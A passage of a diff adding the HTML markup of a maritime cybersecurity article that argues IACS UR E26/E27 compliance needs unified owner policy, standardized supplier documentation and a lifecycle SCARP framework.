+      margin: 0px 0px 36px;
+    "
+  />
+
+  <!--══ SECTION Ⅱ — THREE PROBLEMS ══-->
+  <div style="margin-bottom: 36px">
+    <div
+      style="align-items: center; display: flex; gap: 10px; margin-bottom: 16px"
+    >
+      <div
+        style="
+          background: linear-gradient(rgb(21, 79, 122), rgb(26, 158, 130));
+          border-radius: 2px;
+          flex-shrink: 0;
+          height: 26px;
+          width: 4px;
+        "
+      ></div>
+      <h2
+        style="
+          color: #0a2342;
+          font-size: 17px;
+          font-weight: 800;
+          letter-spacing: 0.1px;
+          margin: 0px;
+        "
+      >
+        Ⅱ. Three Problems Everyone Faces — but Few Speak About
+      </h2>
+    </div>
+    <p
+      style="
+        color: #4a6278;
+        font-size: 14px;
+        line-height: 1.85;
+        margin: 0px 0px 20px;
+      "
+    >
+      Based on extensive work across major LPGC and container-ship projects in
+      Asia and globally, one conclusion is clear:
+      <strong style="color: #0a2342"
+        >the fundamental problem is not technology — it is structure.</strong
+      >
+      These three failure patterns repeat across nearly every project.
+    </p>
+
+    <!--Problem 1-->
+    <div
+      style="
+        background: rgb(255, 248, 240);
+        border-color: rgb(245, 213, 160) rgb(245, 213, 160) rgb(245, 213, 160)
+          rgb(230, 126, 34);
+        border-image: initial;
+        border-left: 4px solid #e67e22;
+        border-radius: 0px 12px 12px 0px;
+        border-style: solid;
+        border-width: 1px 1px 1px 4px;
+        border: 1px solid rgb(245, 213, 160);
+        margin-bottom: 16px;
+        padding: 22px 24px;
+      "
+    >
+      <div
+        style="
+          align-items: center;
+          display: flex;
+          gap: 10px;
+          margin-bottom: 10px;
+        "
+      >
+        <span
+          style="
+            background: rgb(230, 126, 34);
+            border-radius: 20px;
+            color: white;
+            font-size: 10px;
+            font-weight: 800;
+            letter-spacing: 0.8px;
+            padding: 3px 10px;
+          "
+          >Problem 01</span
+        >
+        <h3
+          style="color: #0a2342; font-size: 15px; font-weight: 800; margin: 0px"
+        >
+          Shipyard-to-Shipyard Variability — A Direct Consequence of Missing
+          Owner Policy
+        </h3>
+      </div>
+      <p
+        style="
+          color: #4a6278;
+          font-size: 14px;
+          line-height: 1.8;
+          margin: 0px 0px 12px;
+        "
+      >
+        Even with identical ship types and specifications, UR E26/E27 outcomes
+        differ drastically between shipyards. The reason is simple:
+        <strong style="color: #0a2342"
+          >there is no unified Owner Cybersecurity Policy.</strong
+        >
+      </p>
+      <p
+        style="
+          color: #4a6278;
+          font-size: 13.5px;
+          line-height: 1.75;
+          margin: 0px 0px 10px;
+        "
+      >
+        Without it, the industry sees:
+      </p>
+      <ul
+        style="
+          display: flex;
+          flex-direction: column;
+          gap: 7px;
+          list-style: none;
+          margin: 0px;
+          padding: 0px;
+        "
+      >
+        <li
+          style="
+            align-items: flex-start;
+            color: #354a5e;
+            display: flex;
+            font-size: 13.5px;
+            gap: 10px;
+          "
+        >
+          <span style="color: #e67e22; font-weight: 800; margin-top: 1px"
+            >·</span
+          >
+          Varying readiness levels for annual cyber surveys
+        </li>
+        <li
+          style="
+            align-items: flex-start;
+            color: #354a5e;
+            display: flex;
+            font-size: 13.5px;
+            gap: 10px;
+          "
+        >
+          <span style="color: #e67e22; font-weight: 800; margin-top: 1px"
+            >·</span
+          >
+          Confusion during incident response — roles reinvented project by
+          project
+        </li>
+        <li
+          style="
+            align-items: flex-start;
+            color: #354a5e;
+            display: flex;
+            font-size: 13.5px;
+            gap: 10px;
+          "
+        >
+          <span style="color: #e67e22; font-weight: 800; margin-top: 1px"
+            >·</span
+          >
+          No standardized monitoring or response mechanism across the fleet
+        </li>
+        <li
+          style="
+            align-items: flex-start;
+            color: #354a5e;
+            display: flex;
+            font-size: 13.5px;
+            gap: 10px;
+          "
+        >
+          <span style="color: #e67e22; font-weight: 800; margin-top: 1px"
+            >·</span
+          >
+          A gradual, compounding decline in fleet-wide cyber resilience
+        </li>
+      </ul>
+      <p
+        style="
+          color: #7a4f10;
+          font-size: 13px;
+          font-weight: 700;
+          margin: 12px 0px 0px;
+        "
+      >
+        This is not a shipyard problem. It is an industry-wide structural
+        problem.
+      </p>
+    </div>
+
+    <!--Problem 2-->
+    <div
+      style="
+        background: rgb(255, 248, 240);
+        border-color: rgb(245, 213, 160) rgb(245, 213, 160) rgb(245, 213, 160)
+          rgb(230, 126, 34);
+        border-image: initial;
+        border-left: 4px solid #e67e22;
+        border-radius: 0px 12px 12px 0px;
+        border-style: solid;
+        border-width: 1px 1px 1px 4px;
+        border: 1px solid rgb(245, 213, 160);
+        margin-bottom: 16px;
+        padding: 22px 24px;
+      "
+    >
+      <div
+        style="
+          align-items: center;
+          display: flex;
+          gap: 10px;
+          margin-bottom: 10px;
+        "
+      >
+        <span
+          style="
+            background: rgb(230, 126, 34);
+            border-radius: 20px;
+            color: white;
+            font-size: 10px;
+            font-weight: 800;
+            letter-spacing: 0.8px;
+            padding: 3px 10px;
+          "
+          >Problem 02</span
+        >
+        <h3
+          style="color: #0a2342; font-size: 15px; font-weight: 800; margin: 0px"
+        >
+          Supplier Documentation Gaps — E27 Quality Determines E26 Quality
+        </h3>
+      </div>
+      <p
+        style="
+          color: #4a6278;
+          font-size: 14px;
+          line-height: 1.8;
+          margin: 0px 0px 12px;
+        "
+      >
+        E27 supplier documentation is the primary input for UR E26 SCARP. When
+        that input is weak, the entire chain degrades:
+      </p>
+      <div
+        style="
+          display: grid;
+          gap: 8px;
+          grid-template-columns: 1fr 1fr;
+          margin-bottom: 12px;
+        "
+      >
+        <div
+          style="
+            background: rgb(255, 239, 213);
+            border-radius: 8px;
+            color: #7a4f10;
+            font-size: 13px;
+            padding: 10px 14px;
+          "
+        >
+          ⚠️ Supplier documentation varies dramatically
+        </div>
+        <div
+          style="
+            background: rgb(255, 239, 213);
+            border-radius: 8px;
+            color: #7a4f10;
+            font-size: 13px;
+            padding: 10px 14px;
+          "
+        >
+          ⚠️ RA/RM results become inconsistent
+        </div>
+        <div
+          style="
+            background: rgb(255, 239, 213);
+            border-radius: 8px;
+            color: #7a4f10;
+            font-size: 13px;
+            padding: 10px 14px;
+          "
+        >
+          ⚠️ Class reviews are repeatedly delayed
+        </div>
+        <div
+          style="
+            background: rgb(255, 239, 213);
+            border-radius: 8px;
+            color: #7a4f10;
+            font-size: 13px;
+            padding: 10px 14px;
+          "
+        >
+          ⚠️ Shipyards and owners redo the same work
+        </div>
+      </div>
+      <p style="color: #7a4f10; font-size: 13px; font-weight: 700; margin: 0px">
+        This is more than a project-level issue — it reflects a structural lack
+        of industry standardization.
+      </p>
+    </div>
+
+    <!--Problem 3-->
+    <div
+      style="
+        background: rgb(255, 248, 240);
+        border-color: rgb(245, 213, 160) rgb(245, 213, 160) rgb(245, 213, 160)
+          rgb(230, 126, 34);
+        border-image: initial;
+        border-left: 4px solid #e67e22;
+        border-radius: 0px 12px 12px 0px;
+        border-style: solid;
+        border-width: 1px 1px 1px 4px;
+        border: 1px solid rgb(245, 213, 160);
+        padding: 22px 24px;
+      "
+    >
+      <div
+        style="
+          align-items: center;
+          display: flex;
+          gap: 10px;
+          margin-bottom: 10px;
+        "
+      >
+        <span
+          style="
+            background: rgb(230, 126, 34);
+            border-radius: 20px;
+            color: white;
+            font-size: 10px;
+            font-weight: 800;
+            letter-spacing: 0.8px;
+            padding: 3px 10px;
+          "
+          >Problem 03</span
+        >
+        <h3
+          style="color: #0a2342; font-size: 15px; font-weight: 800; margin: 0px"
+        >
+          SCARP Misunderstood — It Is Not a Document, It Is a Cyber Resilience
+          Operating Program
+        </h3>
+      </div>
+      <p
+        style="
+          color: #4a6278;
+          font-size: 14px;
+          line-height: 1.8;
+          margin: 0px 0px 12px;
+        "
+      >
+        Many stakeholders still treat SCARP as a report or a submission
+        document. In reality:
+        <strong style="color: #0a2342"
+          >SCARP is the cyber resilience operating system of the ship.</strong
+        >
+        A high-quality SCARP requires all of the following — integrated, not
+        assembled independently:
+      </p>
+      <div
+        style="
+          background: rgb(247, 250, 254);
+          border-radius: 8px;
+          border: 1px solid rgb(209, 224, 238);
+          padding: 14px 18px;
+        "
+      >
+        <ul
+          style="
+            display: flex;
+            flex-direction: column;
+            gap: 7px;
+            list-style: none;
+            margin: 0px;
+            padding: 0px;
+          "
+        >
+          <li
+            style="
+              align-items: flex-start;
+              color: #354a5e;
+              display: flex;
+              font-size: 13.5px;
+              gap: 10px;
+            "
+          >
+            <span style="color: #154f7a; font-weight: 800; margin-top: 1px"
+              >✓</span
+            >
+            Harmonized supplier documentation (E27)
+          </li>
+          <li
+            style="
+              align-items: flex-start;
+              color: #354a5e;
+              display: flex;
+              font-size: 13.5px;
+              gap: 10px;
+            "
+          >
+            <span style="color: #154f7a; font-weight: 800; margin-top: 1px"
+              >✓</span
+            >
+            System architecture and interface analysis
+          </li>
+          <li
+            style="
+              align-items: flex-start;
+              color: #354a5e;
+              display: flex;
+              font-size: 13.5px;
+              gap: 10px;
+            "
+          >
+            <span style="color: #154f7a; font-weight: 800; margin-top: 1px"
+              >✓</span
+            >
+            Zone &amp; Conduit definition
+          </li>
+          <li
+            style="
+              align-items: flex-start;
+              color: #354a5e;
+              display: flex;
+              font-size: 13.5px;
+              gap: 10px;
+            "
+          >
+            <span style="color: #154f7a; font-weight: 800; margin-top: 1px"
+              >✓</span
+            >
+            Unified RA/RM methodology
+          </li>
+          <li
+            style="
+              align-items: flex-start;
+              color: #354a5e;
+              display: flex;
+              font-size: 13.5px;
+              gap: 10px;
+            "
+          >
+            <span style="color: #154f7a; font-weight: 800; margin-top: 1px"
+              >✓</span
+            >
+            Alignment with class society requirements
+          </li>
+        </ul>
+      </div>
+      <p
+        style="
+          color: #7a4f10;
+          font-size: 13px;
+          font-weight: 700;
+          margin: 12px 0px 0px;
+        "
+      >
+        These tasks must be integrated. A fragmented approach simply cannot
+        succeed.
+      </p>
+    </div>
+  </div>
+
+  <!--══ DIVIDER ══-->
+  <hr
+    style="
+      border-color: currentcolor;
+      border-image: initial;
+      border-style: none;
+      border-top: 2px solid #e2eaf3;
+      border-width: medium;
+      border: none;
+      margin: 0px 0px 36px;
+    "
+  />
+
+  <!--══ SECTION Ⅲ — CORE MESSAGE ══-->
+  <div
+    style="
+      background: linear-gradient(
+        135deg,
+        rgb(10, 35, 66) 0%,
+        rgb(26, 58, 92) 50%,
+        rgb(10, 35, 66) 100%
+      );
+      border-radius: 14px;
+      margin-bottom: 36px;
+      padding: 28px 32px;
+    "
+  >
+    <div
+      style="
+        color: #7effd8;
+        font-size: 10px;
+        font-weight: 800;
+        letter-spacing: 1.8px;
+        margin-bottom: 14px;
+        text-transform: uppercase;
+      "
+    >
+      The Direction the Industry Must Choose
+    </div>
+    <p
+      style="
+        color: white;
+        font-size: 16px;
+        font-weight: 700;
+        line-height: 1.75;
+        margin: 0px 0px 14px;
+      "
+    >
+      Standardization &amp; Central Governance
+    </p>
+    <p
+      style="
+        color: #c8dff0;
+        font-size: 13.5px;
+        line-height: 1.85;
+        margin: 0px 0px 16px;
+      "
+    >
+      Within the next five years, UR E26/E27 will evolve from compliance rules
+      into the
+      <strong style="color: #ffe082"
+        >actual operating model of the maritime industry.</strong
+      >
+      If shipyards, suppliers, and shipowners continue working in fragmented,
+      inconsistent ways, the entire ecosystem will face operational instability.
+    </p>
+    <p style="color: #9ab5c9; font-size: 14px; margin: 0px 0px 12px">
+      The industry needs one unified structural model:
+    </p>
+    <div
+      style="
+        align-items: center;
+        display: flex;
+        flex-wrap: wrap;
+        gap: 0px;
+        margin-bottom: 16px;
+      "
+    >
+      <div
+        style="
+          background: rgba(255, 255, 255, 0.12);
+          border-radius: 8px;
+          color: #ffe082;
+          font-size: 13px;
+          font-weight: 700;
+          padding: 10px 16px;
+        "
+      >
+        Owner Policy
+      </div>
+      <div
+        style="
+          color: #7effd8;
+          font-size: 18px;
+          font-weight: 300;
+          padding: 0px 8px;
+        "
+      >
+        →
+      </div>
+      <div
+        style="
+          background: rgba(255, 255, 255, 0.12);
+          border-radius: 8px;
+          color: #ffe082;
+          font-size: 13px;
+          font-weight: 700;
+          padding: 10px 16px;
+        "
+      >
+        CRSI
+      </div>
+      <div
+        style="
+          color: #7effd8;
+          font-size: 18px;
+          font-weight: 300;
+          padding: 0px 8px;
+        "
+      >
+        →
+      </div>
+      <div
+        style="
+          background: rgba(255, 255, 255, 0.12);
+          border-radius: 8px;
+          color: #ffe082;
+          font-size: 13px;
+          font-weight: 700;
+          padding: 10px 16px;
+        "
+      >
+        Global Standardization
+      </div>
+      <div
+        style="
+          color: #7effd8;
+          font-size: 18px;
+          font-weight: 300;
+          padding: 0px 8px;
+        "
+      >
+        →
+      </div>
+      <div
+        style="
+          background: rgba(255, 255, 255, 0.12);
+          border-radius: 8px;
+          color: #ffe082;
+          font-size: 13px;
+          font-weight: 700;
+          padding: 10px 16px;
+        "
+      >
+        Long-Term SCARP Framework
+      </div>
+    </div>
+    <p style="color: #c8dff0; font-size: 13.5px; line-height: 1.8; margin: 0px">
+      These four pillars will reshape the operational foundation of the global
+      maritime industry through the 2030s and 2040s.
+    </p>
+  </div>
+
+  <!--══ SECTION Ⅳ — SOLUTIONS ══-->
+  <div style="margin-bottom: 36px">
+    <div
+      style="align-items: center; display: flex; gap: 10px; margin-bottom: 20px"
+    >
+      <div
+        style="
+          background: linear-gradient(rgb(26, 158, 130), rgb(10, 35, 66));
+          border-radius: 2px;
+          flex-shrink: 0;
+          height: 26px;
+          width: 4px;
+        "
+      ></div>
+      <h2
+        style="
+          color: #0a2342;
+          font-size: 17px;
+          font-weight: 800;
+          letter-spacing: 0.1px;
+          margin: 0px;
+        "
+      >
+        Ⅳ. Four Industry-Level Solutions
+      </h2>
+    </div>
+    <p
+      style="
+        color: #4a6278;
+        font-size: 14px;
+        line-height: 1.85;
+        margin: 0px 0px 20px;
+      "
+    >
+      Based on deep field experience and analysis, four practical solutions
+      emerge — not strategies for a single company, but for the competitiveness
+      and ecosystem stability of the entire sector.
+    </p>
+    <div style="display: flex; flex-direction: column; gap: 12px">
+      <div
+        style="
+          align-items: flex-start;
+          background: rgb(247, 250, 254);
+          border-radius: 12px;
+          border: 1px solid rgb(209, 224, 238);
+          display: flex;
+          gap: 16px;
+          padding: 18px 20px;
+        "
+      >
+        <div
+          style="
+            align-items: center;
+            background: rgb(10, 35, 66);
+            border-radius: 50%;
+            color: white;
+            display: flex;
+            font-size: 13px;
+            font-weight: 800;
+            height: 32px;
+            justify-content: center;
+            margin-top: 2px;
+            min-width: 32px;
+            width: 32px;
+          "
+        >
+          1
+        </div>
+        <div>
+          <div
+            style="
+              color: #0a2342;
+              font-size: 14px;
+              font-weight: 800;
+              margin-bottom: 4px;
+            "
+          >
+            A unified Owner Cybersecurity Policy across shipowners
+          </div>
+          <div style="color: #4a6278; font-size: 13px; line-height: 1.7">
+            Establishes the common baseline that eliminates per-project
+            interpretation chaos and anchors every downstream deliverable.
+          </div>
+        </div>
+      </div>
+      <div
+        style="
+          align-items: flex-start;
+          background: rgb(247, 250, 254);
+          border-radius: 12px;
+          border: 1px solid rgb(209, 224, 238);
+          display: flex;
+          gap: 16px;
+          padding: 18px 20px;
+        "
+      >
+        <div
+          style="
+            align-items: center;
+            background: rgb(21, 79, 122);
+            border-radius: 50%;
+            color: white;
+            display: flex;
+            font-size: 13px;
+            font-weight: 800;
+            height: 32px;
+            justify-content: center;
+            margin-top: 2px;
+            min-width: 32px;
+            width: 32px;
+          "
+        >
+          2
+        </div>
+        <div>
+          <div
+            style="
+              color: #0a2342;
+              font-size: 14px;
+              font-weight: 800;
+              margin-bottom: 4px;
+            "
+          >
+            Standardized E27 documentation and data frameworks
+          </div>
+          <div style="color: #4a6278; font-size: 13px; line-height: 1.7">
+            Common templates, checklists, and architectural description
+            standards that suppliers can apply consistently across all projects.
+          </div>
+        </div>
+      </div>
+      <div
+        style="
+          align-items: flex-start;
+          background: rgb(247, 250, 254);
+          border-radius: 12px;
+          border: 1px solid rgb(209, 224, 238);
+          display: flex;
+          gap: 16px;
+          padding: 18px 20px;
+        "
+      >
+        <div
+          style="
+            align-items: center;
+            background: rgb(26, 158, 130);
+            border-radius: 50%;
+            color: white;
+            display: flex;
+            font-size: 13px;
+            font-weight: 800;
+            height: 32px;
+            justify-content: center;
+            margin-top: 2px;
+            min-width: 32px;
+            width: 32px;
+          "
+        >
+          3
+        </div>
+        <div>
+          <div
+            style="
+              color: #0a2342;
+              font-size: 14px;
+              font-weight: 800;
+              margin-bottom: 4px;
+            "
+          >
+            Minimized execution gaps between shipyards and suppliers
+          </div>
+          <div style="color: #4a6278; font-size: 13px; line-height: 1.7">
+            CRSI-led coordination ensures that shipyard design decisions and
+            supplier documentation remain aligned throughout the build schedule
+            — not discovered as conflicts at SCARP integration.
+          </div>
+        </div>
+      </div>
+      <div
+        style="
+          align-items: flex-start;
+          background: rgb(247, 250, 254);
+          border-radius: 12px;
+          border: 1px solid rgb(209, 224, 238);
+          display: flex;
+          gap: 16px;
+          padding: 18px 20px;
+        "
+      >
+        <div
+          style="
+            align-items: center;
+            background: rgb(230, 126, 34);
+            border-radius: 50%;
+            color: white;
+            display: flex;
+            font-size: 13px;
+            font-weight: 800;
+            height: 32px;
+            justify-content: center;
+            margin-top: 2px;
+            min-width: 32px;
+            width: 32px;
+          "
+        >
+          4
+        </div>
+        <div>
+          <div
+            style="
+              color: #0a2342;
+              font-size: 14px;
+              font-weight: 800;
+              margin-bottom: 4px;
+            "
+          >
+            A long-term SCARP model linking newbuilding and operation
+          </div>
+          <div style="color: #4a6278; font-size: 13px; line-height: 1.7">
+            SCARP must not end at delivery. A living SCARP framework —
+            maintained through the operational lifecycle — is the only model
+            that supports annual cyber surveys and incident response at sea.
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!--══ DIVIDER ══-->
+  <hr
+    style="
+      border-color: currentcolor;
+      border-image: initial;
+      border-style: none;
+      border-top: 2px solid #e2eaf3;
+      border-width: medium;
+      border: none;
+      margin: 0px 0px 36px;
+    "
+  />
+
+  <!--══ KEY TAKEAWAYS ══-->
+  <div style="margin-bottom: 36px">
+    <div
+      style="align-items: center; display: flex; gap: 10px; margin-bottom: 20px"
+    >
+      <div
+        style="
+          background: linear-gradient(rgb(10, 35, 66), rgb(26, 158, 130));
+          border-radius: 2px;
+          flex-shrink: 0;
+          height: 26px;
+          width: 4px;
+        "
+      ></div>
+      <h2
+        style="color: #0a2342; font-size: 17px; font-weight: 800; margin: 0px"
+      >
+        Key Takeaways
+      </h2>
+    </div>
+    <div style="display: grid; gap: 14px; grid-template-columns: 1fr 1fr">
+      <div
+        style="
+          background: rgb(240, 247, 255);
+          border-radius: 12px;
+          border: 1px solid rgb(204, 224, 245);
+          padding: 18px 20px;
+        "
+      >
+        <div style="font-size: 20px; margin-bottom: 8px">🚢</div>
+        <div
+          style="
+            color: #0a2342;
+            font-size: 13px;
+            font-weight: 800;
+            margin-bottom: 6px;
+          "
+        >
+          Smarter Ships = Greater Attack Surface
+        </div>
+        <div style="color: #4a6278; font-size: 13px; line-height: 1.7">
+          Every layer of automation, connectivity, and intelligence added to a
+          vessel expands its cyber exposure. UR E26/E27 are the industry's
+          structured response to this reality.
+        </div>
+      </div>
+      <div
+        style="
+          background: rgb(240, 247, 255);
+          border-radius: 12px;
+          border: 1px solid rgb(204, 224, 245);
+          padding: 18px 20px;
+        "
+      >
+        <div style="font-size: 20px; margin-bottom: 8px">📐</div>
+        <div
+          style="
+            color: #0a2342;
+            font-size: 13px;
+            font-weight: 800;
+            margin-bottom: 6px;
+          "
+        >
+          Basic Design Is the Only Entry Point
+        </div>
+        <div style="color: #4a6278; font-size: 13px; line-height: 1.7">
+          Cybersecurity embedded at L0/L1 costs a fraction of what it costs to
+          retrofit. Schedule and specification logic — learned over decades in
+          shipbuilding — applies equally to E26/E27.
+        </div>
+      </div>
+      <div
+        style="
+          background: rgb(240, 247, 255);
+          border-radius: 12px;
+          border: 1px solid rgb(204, 224, 245);
+          padding: 18px 20px;
+        "
+      >
+        <div style="font-size: 20px; margin-bottom: 8px">🏛️</div>
+        <div
+          style="
+            color: #0a2342;
+            font-size: 13px;
+            font-weight: 800;
+            margin-bottom: 6px;
+          "
+        >
+          SCARP Is a Program, Not a Document
+        </div>
+        <div style="color: #4a6278; font-size: 13px; line-height: 1.7">
+          Treating SCARP as a submission deliverable rather than a living
+          operational framework produces compliance on paper and vulnerability
+          at sea.
+        </div>
+      </div>
+      <div
+        style="
+          background: rgb(240, 247, 255);
+          border-radius: 12px;
+          border: 1px solid rgb(204, 224, 245);
+          padding: 18px 20px;
+        "
+      >
+        <div style="font-size: 20px; margin-bottom: 8px">⏳</div>
+        <div
+          style="
+            color: #0a2342;
+            font-size: 13px;
+            font-weight: 800;
+            margin-bottom: 6px;
+          "
+        >
+          The Window to Act Is Now
+        </div>
+        <div style="color: #4a6278; font-size: 13px; line-height: 1.7">
+          Within five years, E26/E27 will be the operating model, not the
+          compliance target. Shipyards and owners that build governance
+          infrastructure now will lead. Those that wait will absorb the cost.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!--══ CONCLUSION ══-->
+  <div
+    style="
+      background: linear-gradient(
+        135deg,
+        rgb(10, 35, 66) 0%,
+        rgb(21, 79, 122) 100%
+      );
+      border-radius: 14px;
+      margin-bottom: 36px;
+      padding: 28px 32px;
+    "
+  >
+    <div
+      style="
+        color: #7effd8;
+        font-size: 10px;
+        font-weight: 800;
+        letter-spacing: 1.8px;
+        margin-bottom: 14px;
+        text-transform: uppercase;
+      "
+    >
+      A Message to the Shipbuilding and Maritime Industry
+    </div>
+    <p
+      style="
+        color: white;
+        font-size: 15px;
+        font-weight: 700;
+        line-height: 1.75;
+        margin: 0px 0px 14px;
+      "
+    >
+      UR E26/E27 Are Not Documents to Be Submitted — They Are the New Operating
+      Model for Future Ships
+    </p>
+    <p
+      style="
+        color: #c8dff0;
+        font-size: 13.5px;
+        line-height: 1.85;
+        margin: 0px 0px 14px;
+      "
+    >
+      This requires rethinking shipyard quality standards, supplier
+      technological capability, shipowner governance, class society roles, and
+      the full operational lifecycle.
+      <strong style="color: #ffe082"
+        >This transformation cannot wait until later.</strong
+      >
+    </p>
+    <p
+      style="
+        color: #7effd8;
+        font-size: 14px;
+        font-weight: 700;
+        line-height: 1.75;
+        margin: 0px 0px 14px;
+      "
+    >
+      "The structure we use today cannot protect the ships of tomorrow."
+    </p>
+    <p
+      style="color: #c8dff0; font-size: 13.5px; line-height: 1.85; margin: 0px"
+    >
+      This is the moment for the global maritime industry to move toward a more
+      standardized structure, a more unified model, and a more resilient
+      operating foundation. The Shipjobs series will continue to share real
+      field insights and practical frameworks — as the shipbuilding ecosystem
+      undergoes the most important structural transformation in its history.
+    </p>
+  </div>
+
+  <!--══ HASHTAGS ══-->
+  <div style="display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 36px">
+    <span
+      style="
+        background: rgb(232, 244, 255);
+        border-radius: 20px;
+        color: #1a6fa8;
+        font-size: 11px;
+        font-weight: 700;
+        padding: 4px 12px;
+      "
+      >#IACS_UR_E26</span
+    >
+    <span
+      style="
+        background: rgb(232, 244, 255);
+        border-radius: 20px;
+        color: #1a6fa8;
+        font-size: 11px;
+        font-weight: 700;
+        padding: 4px 12px;
+      "
+      >#IACS_UR_E27</span
+    >
+    <span
+      style="
+        background: rgb(232, 244, 255);
+        border-radius: 20px;
+        color: #1a6fa8;
+        font-size: 11px;
+        font-weight: 700;
+        padding: 4px 12px;
+      "
+      >#MaritimeCybersecurity</span
+    >
+    <span
+      style="
+        background: rgb(232, 244, 255);
+        border-radius: 20px;
+        color: #1a6fa8;
+        font-size: 11px;
+        font-weight: 700;
+        padding: 4px 12px;
+      "
+      >#SmartShip</span
+    >
+    <span
+      style="
+        background: rgb(232, 244, 255);
+        border-radius: 20px;
+        color: #1a6fa8;
+        font-size: 11px;
+        font-weight: 700;
+        padding: 4px 12px;
+      "
+      >#SCARP</span
+    >
+    <span
+      style="
+        background: rgb(232, 244, 255);
+        border-radius: 20px;
+        color: #1a6fa8;
+        font-size: 11px;
+        font-weight: 700;
+        padding: 4px 12px;
+      "
+      >#CyberByDesign</span
+    >
+    <span
+      style="
+        background: rgb(232, 244, 255);
+        border-radius: 20px;
+        color: #1a6fa8;
+        font-size: 11px;
+        font-weight: 700;
+        padding: 4px 12px;
+      "
+      >#OwnerPolicy</span
+    >
+    <span
+      style="
+        background: rgb(232, 244, 255);
+        border-radius: 20px;
+        color: #1a6fa8;
+        font-size: 11px;
+        font-weight: 700;
+        padding: 4px 12px;
+      "
+      >#CRSI</span
+    >
+    <span
+      style="
+        background: rgb(232, 244, 255);
+        border-radius: 20px;
+        color: #1a6fa8;
+        font-size: 11px;
+        font-weight: 700;
+        padding: 4px 12px;
+      "
+      >#Newbuilding</span
+    >
+    <span
+      style="
+        background: rgb(232, 244, 255);
+        border-radius: 20px;
+        color: #1a6fa8;
+        font-size: 11px;
+        font-weight: 700;
+        padding: 4px 12px;
+      "
+      >#Maritime40</span
+    >
+  </div>
+
+  <!--══ AUTHOR CARD ══-->
+  <div
+    style="
+      align-items: center;
+      background: linear-gradient(
+        135deg,
+        rgb(10, 35, 66) 0%,
+        rgb(21, 79, 122) 55%,
+        rgb(26, 158, 130) 100%
+      );
+      border-radius: 14px;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 20px;
+      padding: 24px 28px;
+    "
+  >
+    <img
+      alt="Captain Ethan"
+      src="https://github.com/MaritimeCyber/General/blob/main/Asset/img/member/insung.jpeg?raw=true"
+      style="
+        border-radius: 50%;
+        border: 2px solid rgb(26, 158, 130);
+        flex-shrink: 0;
+        height: 52px;
+        object-fit: cover;
+        width: 52px;
+      "
+    />
+    <div style="flex: 1 1 0%; min-width: 200px">
+      <div
+        style="
+          color: white;
+          font-size: 15px;
+          font-weight: 800;
+          margin-bottom: 4px;
+        "
+      >
+        Captain Ethan
+      </div>
+      <div style="color: #9ab5c9; font-size: 11px; line-height: 1.65">
+        Maritime 4.0 · AI, Data &amp; Cyber Security<br />
+        - LinkedIn :
+        <a href="https://www.linkedin.com/in/shipjobs/" style="color: #7effd8"
+          >https://www.linkedin.com/in/shipjobs/</a
+        ><br />
+        <strong style="color: white">Collaborator : </strong
+        ><strong style="color: white">Lew, Julius, Jin, Morgan, Yeon</strong>
+      </div>
+    </div>
+    <div
+      style="
+        align-items: center;
+        color: #9ab5c9;
+        display: flex;
+        font-size: 11px;
+        gap: 5px;
+      "
+    >
+      <span>📅</span><span>April 2026</span>
+    </div>
+  </div>
+</div>
